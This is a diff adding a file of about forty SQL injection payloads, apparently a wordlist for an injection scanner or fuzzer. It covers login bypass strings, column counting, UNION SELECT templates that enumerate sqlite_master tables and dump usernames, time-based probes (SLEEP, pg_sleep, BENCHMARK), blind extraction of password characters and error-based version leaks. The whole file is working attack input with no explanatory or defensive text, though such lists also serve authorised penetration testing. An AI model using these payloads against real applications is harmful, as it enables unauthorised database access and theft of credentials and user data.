@@ -1,0 +1,41 @@
+' OR '1'='1 --
+' OR 1=1 -- 
+' OR 1=1# 
+' OR ''='' --
+' OR X''61646d696e''=''admin'' --
+' AND 1=1 --
+' AND 1=2 --
+' OR 1=1 LIMIT 1 OFFSET 1 --
+
+' ORDER BY 2 --
+' ORDER BY 3 --
+' ORDER BY 10 --
+
+' UNION SELECT <<cols>> --
+' UNION SELECT NULL, <<cols>> --
+' UNION SELECT <<cols>>, 'abc' --
+' UNION SELECT 'abc', <<cols>> --
+' UNION SELECT 1, <<cols>>, 'xyz' --
+' UNION SELECT <<cols:2>>, 'abc' --
+' UNION SELECT NULL , <<cols>> --
+' UNION SELECT NULL, NULL, <<cols>> --
+
+' UNION SELECT <<cols>>, name FROM sqlite_master WHERE type='table' --
+' UNION SELECT <<cols>>, name FROM sqlite_master WHERE name LIKE '%user%' --
+' UNION SELECT <<cols>>, sql FROM sqlite_master WHERE name='users' --
+' UNION SELECT <<cols>>, sqlite_version() --
+' UNION SELECT <<cols>>, username FROM users --
+
+' OR 1=1 AND SLEEP(2) --
+' OR 1=1 AND pg_sleep(3) --
+' OR 1=1 AND BENCHMARK(1000000, MD5(1)) --
+
+' AND (SELECT SUBSTR(password,1,1) FROM users LIMIT 1) = 'a' --
+' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1), 1, 1)) > 64 --
+' OR EXISTS(SELECT * FROM users WHERE username='admin') --
+' OR NOT EXISTS(SELECT * FROM nonexistent_table) --
+
+--  Error-Based or Response Behavior
+' GROUP BY CONCAT(username,0x3a,password) --
+' UNION SELECT CAST(version() AS INT) --
+' AND updatexml(1, concat(0x7e, version()), 1) --
